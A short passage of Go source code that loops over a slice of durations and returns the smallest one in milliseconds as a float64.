	min := float64(durations[0].Milliseconds())
	for _, d := range durations[1:] {
		if ms := float64(d.Milliseconds()); ms < min {
			min = ms
		}
	}
	return min
}
